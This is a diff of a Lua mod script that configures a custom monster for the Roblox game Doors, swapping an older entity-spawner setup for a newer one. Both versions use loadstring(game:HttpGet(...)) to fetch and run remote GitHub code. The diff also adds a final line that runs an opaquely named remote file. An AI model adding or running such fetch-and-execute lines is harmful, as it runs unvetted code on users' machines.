@@ -1,146 +1,96 @@
-local Spawner = loadstring(game:HttpGet('https://raw.githubusercontent.com/MuhXd/DoorSuff/main/OtherSuff/DoorEntitySpawn%2BSource'))()
+---====== Load spawner ======---
 
+local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()
 
--- Create entity
+---====== Create entity ======---
 
-local redtweeninfo = TweenInfo.new(3)
-local redinfo = {Color = Color3.new(255,  0, 0)}
-----------
-for i,v in pairs(workspace.CurrentRooms:GetDescendants()) do
-	if v:IsA("Light") then
-		game.TweenService:Create(v,redtweeninfo,redinfo):Play()
-		if v.Parent.Name == "LightFixture" then
-			game.TweenService:Create(v.Parent,redtweeninfo,redinfo):Play()
-		end
-	end
-end
-
-local Sielnce = Instance.new("Sound", workspace)
-Sielnce.SoundId = "rbxassetid://166047422"
-Sielnce:Play()
-Sielnce.Volume = 2
-game.Debris:AddItem(Sielnce, 2)
-local entity = Spawner.createEntity({
-    CustomName = "A-60", -- Custom name of your entity
-    Model = "rbxassetid://12158931101", -- Can be GitHub file or rbxassetid
-    Speed = 700, -- Percentage, 100 = default Rush speed
-    DelayTime = 5, -- Time before starting cycles (seconds)
-    HeightOffset = 1,
-    CanKill = true,
-    NoDieOnCrouching = false,
-    NoHiding = false,
-    AntiCrucifix = true,
-    KillRange = 40,
-    OneRoom = false,
-    DieOnLook = false,
-    BreakLights = false,
-    BackwardsMovement = false,
-     MovementDeath = {
-        false, -- Turned On?
-        '1',  --- '1'= 'Instant Without Being Looked out' | '2' = 'With Being Looked At'
-    },
-    FlickerLights = {
-        true, -- Enabled/Disabled
-        1, -- Time (seconds)
-    },
-EntitySounds = { -- Can Get rid Of
-PlaySound = {
-              "https://github.com/Nowhywhat/Doors-mode/blob/main/a-60-sound-(far)-made-with-Voicemod.mp3?raw=true", -- SoundId Link or Roblox ID
-            { Volume = 3 }, -- Sound properties
-       },
-        
-                   
-          Footsteps = {
-             "https://github.com/Nowhywhat/Doors-mode/blob/main/a-60-sound-(far)-made-with-Voicemod.mp3?raw=true", -- SoundId Link or Roblox ID
-              { Volume = 3 }, -- Sound properties
-          },
-    }, -- Up to Here
-
-    Cycles = {
-        Min = 4,
-        Max = 4,
-        WaitTime = 1,
-    },
-    CamShake = {
-        true, -- Enabled/Disabled
-        {10.5, 20, 0.1, 1}, -- Shake values (don't change if you don't know)
-        100, -- Shake start distance (from Entity to you)
-    },
-    Jumpscare = {
-        true, -- Enabled/Disabled
-        {
-            Type = "2", -- "Normal" or 1 | "Pop" to 1 | "endlessdoorsrebound" to "Rebound" to 1 | More coming Soon
-            Type = "2", -- "Normal" or 2 | "Pop" to 2 | "endlessdoorsrebound" to "Rebound" to 2 | More coming Soon
-            Image1 = "rbxassetid://192267375, rbxassetid://1972219024, rbxassetid://1822114127, rbxassetid://3413871766", -- Image1 url
-            Image2 = "rbxassetid://1822114127, rbxassetid://1972219024, rbxassetid://1822114127, rbxassetid://3413871766", -- Image2 url
-            Shake = true,
-            Sound1 = {
-                "https://github.com/huyhoangphuc/jee/blob/main/XRecorder_Edited_18062024_164103.mp3?raw=true", -- SoundId Link or Roblox ID
-                { Volume = 5 }, -- Sound properties
-            },
-            Sound2 = {
-                "https://github.com/huyhoangphuc/jee/blob/main/XRecorder_Edited_18062024_164103.mp3?raw=true", -- SoundId Link or Roblox ID
-                { Volume = 5 }, -- Sound properties
-            },
-            Flashing = {
-                true, -- Enabled/Disabled
-                Color3.fromRGB(255, 255, 255), -- Color
-            },
-            Tease = {
-                true, -- Enabled/Disabled
-                Min = 1,
-                Max = 3,
-            },
-        },
-    },
-    Color = 'CuriousLight', -- CuriousLight ( Yellow ) | GuidingLight ( Blue )
-    DiffrentMessages = true,
-    CustomDialog = {  
-        {"You can", "put your", "custom death", "message here."}, -- Death Messages
-        {"Stop Dieing"},
-        {"Bruh", "Use what you have learned from Rush!"},
-        {"It seems like Template is causing quite the ruckus...", "Hide in a closet or bed as quickly as possible!"},
-         {"I have told You What to do", "YOU JUST HAVE A SKILL ISSUE"}
-    }
+local entity = spawner.Create({
+	Entity = {
+		Name = "MultiMonster",
+		Asset = "rbxassetid://12158931101",
+		HeightOffset = 0
+	},
+	Lights = {
+		Flicker = {
+			Enabled = false,
+			Duration = 1
+		},
+		Shatter = false,
+		Repair = false
+	},
+	CameraShake = {
+		Enabled = true,
+		Range = 100,
+		Values = {1.5, 20, 0.1, 1}
+	},
+	Movement = {
+		Speed = 300,
+		Delay = 5,
+		Reversed = false
+	},
+	Rebounding = {
+		Enabled = false,
+		Type = "Blitz",
+		Min = 1,
+		Max = math.random(1, 2),
+		Delay = math.random(10, 30) / 10
+	},
+	Damage = {
+		Enabled = true,
+		Range = 100,
+		Amount = 20
+	},
+	Crucifixion = {
+		Enabled = true,
+		Range = 40,
+		Resist = false,
+		Break = true
+	},
+	Death = {
+		Type = "Curious",
+		Hints = {"Oh... Hello.", "I didn't expect to see you here.", "Let's see what you died to.", "Oh, one of my favorites.", "She said we should call that one A-60.", "Well... I'll see you later, right? You'll come back?", "Haha... of course you will."},
+		Cause = ""
+	}
 })
 
------[[ Advanced Sctipting ]]-----
+---====== Debug entity ======---
 
-entity.Debug.OnEntityMoving = function(Invincible,Hiding,plrCollisionPoint)
-print("Invincible: "..tostring(Invincible))
-print("Player to Entity Collision (None hiding Point): "..tostring(plrCollisionPoint))
-print("Hiding: "..tostring(Hiding))
-end
-       
-entity.Debug.OnEntitySpawned = function()
-    print("Entity has spawned:")
-end
 
-entity.Debug.OnEntityDespawned = function()
-    print("Entity has despawned:")
-end
+entity:SetCallback("OnRebounding", function(startOfRebound)
+	-- Variables for the entity
+	local entityModel = entity.Model
+	local main = entityModel:WaitForChild("Main")
+	local attachment = main:WaitForChild("Attachment")
+	local AttachmentSwitch = main:WaitForChild("AttachmentSwitch")
+	local sounds = {
+		footsteps = main:WaitForChild("Footsteps"),
+		playSound = main:WaitForChild("PlaySound"),
+		switch = main:WaitForChild("Switch"),
+		switchBack = main:WaitForChild("SwitchBack")
+	}
 
-entity.Debug.OnEntityStartMoving = function()
-    print("Entity has started moving:")
-end
+	-- Toggle particle emitters and lights within the entityModel
+	-- To switch between green & red state
+	for _, c in attachment:GetChildren() do
+		c.Enabled = (not startOfRebound)
+	end
+	for _, c in AttachmentSwitch:GetChildren() do
+		c.Enabled = startOfRebound
+	end
 
-entity.Debug.OnEntityFinishedRebound = function()
-    print("Entity has finished rebound:")
-end
+	-- Play sounds
+	if startOfRebound == true then
+		sounds.footsteps.PlaybackSpeed = 0.35
+		sounds.playSound.PlaybackSpeed = 0.25
+		sounds.switch:Play()
+	else
+		sounds.footsteps.PlaybackSpeed = 0.25
+		sounds.playSound.PlaybackSpeed = 0.16
+		sounds.switchBack:Play()
+	end
+end)
 
-entity.Debug.OnEntityEnteredRoom = function(entityTable, room)
-    print("Entity:", "has entered room:",room)
-end
+---====== Run entity ======---
 
-entity.Debug.OnLookAtEntity = function()
-    print("Player has looked at entity:")
-end
-
-entity.Debug.OnDeath = function()
-    warn("Player has died.")
-end
-
-------------------------
-
--- Run the created entity
-Spawner.runEntity(entity)
+entity:Run()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/huyhoangphuc/hghg/main/Jshsjshsjdjzjjzjzhshdhdjjdjjdjx"))()
